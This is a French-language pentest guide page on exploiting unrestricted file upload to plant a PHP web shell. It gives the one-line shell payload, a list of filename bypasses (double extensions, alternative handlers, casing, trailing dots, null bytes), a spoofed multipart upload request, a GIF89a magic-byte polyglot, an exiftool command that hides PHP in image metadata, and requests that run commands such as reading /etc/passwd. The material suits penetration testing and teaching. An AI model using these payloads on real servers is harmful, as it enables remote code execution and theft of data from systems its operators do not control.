---
order: 2
title: "Upload sans restriction : implanter un web shell"
description: "Venir à bout des contrôles d'extension, de Content-Type et de magic bytes pour stocker un script exécutable dans un chemin servi par le web, puis le requêter pour une exécution de code à distance."
keywords:
  - upload de fichiers sans restriction
  - web shell
  - double extension
  - usurpation de content-type
  - magic bytes
  - polyglotte
---

# Unrestricted upload

Un endpoint d'upload qui ne contrôle pas fermement l'extension, le contenu et l'emplacement du fichier stocké laisse un attaquant écrire un script exécutable dans un répertoire que le serveur web interprète. Requêter ce fichier exécute alors le code de l'attaquant dans le contexte du compte de service.

## Le payload minimal

Un shell PHP d'une ligne suffit à transformer un fichier stocké en endpoint de commandes :

```php
<?php system($_GET['c']); ?>
```

Une fois stocké à un chemin servi, l'exécution est une seule requête :

```
GET /uploads/shell.php?c=id HTTP/1.1
```

## Venir à bout des contrôles d'extension

Une validation qui inspecte le nom de fichier est fragile. Chacun de ces éléments cible un contrôle faible différent.

**Double extension.** Un serveur qui route sur le premier point, ou un Apache avec un `AddHandler` permissif, exécute le PHP tandis que le contrôle ne voit que `.jpg` :

```
shell.php.jpg
shell.phtml.jpg
```

**Extensions exécutables alternatives.** Les blocklists manquent souvent les gestionnaires moins courants qui s'exécutent tout de même :

```
shell.phtml
shell.php5
shell.phar
shell.pht
```

**Variation de casse.** Une blocklist sensible à la casse qui interdit `.php` manque la casse mixte sur un système de fichiers ou un gestionnaire insensible à la casse :

```
shell.pHp
shell.PHP
```

**Point ou espace en fin.** Windows et certains parseurs suppriment un point ou un espace en fin après l'exécution du contrôle, laissant `shell.php` sur disque :

```
shell.php.
shell.php%20
shell.asp::$DATA
```

**Octet nul (stacks héritées).** Contre un ancien PHP (avant 5.3.4) ou des gestionnaires en C, un octet nul tronque le nom stocké de sorte que tout ce qui le suit est supprimé :

```
shell.php%00.jpg
```

## Usurpation de Content-Type

Lorsque le serveur fait confiance à l'en-tête `Content-Type` multipart, réglez-le sur un type autorisé pendant que le corps reste un script :

```
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['c']); ?>
--X--
```

## Magic bytes et polyglottes

Les contrôles qui reniflent les premiers octets du contenu sont vaincus en préfixant une signature valide. `GIF89a` est un en-tête d'image en texte brut, donc le fichier passe un reniflage `image/gif` tout en restant du PHP valide :

```php
GIF89a
<?php system($_GET['c']); ?>
```

Donnez-lui une double extension si le contrôle de contenu et le contrôle d'extension sont tous deux présents :

```
shell.gif.php
```

Un vrai polyglotte survit à des parseurs plus stricts et aux bibliothèques d'images. Intégrez du PHP dans le commentaire EXIF d'un vrai JPEG, puis faites-le inclure par l'application :

```bash
exiftool -Comment='<?php system($_GET["c"]); ?>' real.jpg -o shell.jpg
mv shell.jpg shell.php
```

## Du stockage à l'exécution

L'écriture n'est que la moitié de l'attaque. Le fichier stocké doit se trouver sous un chemin que l'interpréteur gère, et vous devez apprendre son URL :

- Surveillez la réponse d'upload pour le chemin ou le nom de fichier renvoyé.
- Déduisez le répertoire de la façon dont les fichiers existants sont servis (un avatar à `/uploads/42.png` implique `/uploads/`).
- Lorsque les noms sont aléatoires, abusez d'une seconde fonctionnalité (listing, horodatages prévisibles) pour les récupérer.

Si l'upload atterrit hors de la racine web, associez-le à un sink d'inclusion de fichier local pour l'exécuter, ou utilisez une faille d'extraction d'archive pour le déplacer. Une fois l'URL connue, requêtez-la avec votre paramètre de commande :

```
GET /uploads/shell.gif.php?c=cat%20/etc/passwd HTTP/1.1
```

Pour les stacks non PHP, changez le payload : un shell `.jsp`, `.aspx` ou `.jspx` sur Java/.NET, ou un `.svg` avec un script intégré pour du XSS stocké quand l'exécution n'est pas atteignable.

## Outils

- **[Burp Suite](https://portswigger.net/burp)** : Intruder pour fuzzer les extensions, le Content-Type et les magic bytes.
- **[exiftool](https://exiftool.org/)** : intégrer des payloads dans les métadonnées d'image pour construire des polyglottes.

## Références

- [OWASP: Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [OWASP Web Security Testing Guide: Testing Upload of Malicious Files](https://owasp.org/www-project-web-security-testing-guide/)
- [PayloadsAllTheThings: Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
